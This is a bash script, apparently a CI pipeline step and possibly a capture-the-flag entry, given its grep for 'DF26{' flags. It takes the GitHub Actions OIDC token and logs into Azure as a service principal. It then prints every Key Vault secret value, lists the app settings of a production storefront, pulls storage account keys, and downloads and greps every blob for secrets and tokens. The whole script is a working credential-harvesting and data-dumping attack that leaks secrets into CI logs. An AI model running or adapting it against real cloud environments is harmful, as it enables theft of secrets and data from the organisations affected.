#!/usr/bin/env bash
set +x
TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
CLIENT="72ff278a-9e71-43ec-bac4-2ca303f8e462"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-platform-prod-sea"

OIDC=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
echo "OIDC_LEN=${#OIDC}"
az login --service-principal --username "$CLIENT" --tenant "$TENANT" --federated-token "$OIDC" -o none 2>&1 | head -3 || true

echo "=== SECRET NAMES/VALUES BOTH VAULTS ==="
for v in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  echo "--- vault $v"
  NAMES=$(az keyvault secret list --vault-name "$v" --query '[].name' -o tsv 2>/dev/null)
  echo "NAMES: $NAMES"
  for s in $NAMES; do
    echo "VALSEC[$v/$s]=$(az keyvault secret show --vault-name "$v" --name "$s" --query value -o tsv 2>/dev/null)"
  done
done

echo "=== APP SETTINGS STOREFRONT ==="
az webapp config appsettings list -g "$RG" -n app-tbl-storefront-prod -o json 2>&1 | head -60

echo "=== STORAGE ENUM ==="
for st in sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
  echo "--- ACCOUNT $st"
  K=$(az storage account keys list -g "$RG" -n "$st" --query '[0].value' -o tsv 2>/dev/null)
  echo "KEYLEN=${#K}"
  CS="DefaultEndpointsProtocol=https;AccountName=$st;AccountKey=$K;EndpointSuffix=core.windows.net"
  az storage container list --connection-string "$CS" --query '[].name' -o tsv 2>&1 | head -20
  for c in $(az storage container list --connection-string "$CS" --query '[].name' -o tsv 2>/dev/null); do
    echo "  CONTAINER=$c"
    az storage blob list --connection-string "$CS" -c "$c" --query '[].name' -o tsv 2>&1 | head -30
    for b in $(az storage blob list --connection-string "$CS" -c "$c" --query '[].name' -o tsv 2>/dev/null); do
      echo "  BLOB $c/$b:"
      az storage blob download --connection-string "$CS" -c "$c" -n "$b" -f /tmp/out.bin --no-progress -o none 2>&1 | head -3
      head -c 3000 /tmp/out.bin 2>/dev/null | grep -aiE "DF26\{|secret|token|key|flag|connection|sas" | head -10
      echo "--- raw300: $(head -c 300 /tmp/out.bin 2>/dev/null | tr -d '\0')"
    done
  done
done

echo "=== FLAG GREP DONE ==="
echo "=== DONE ==="
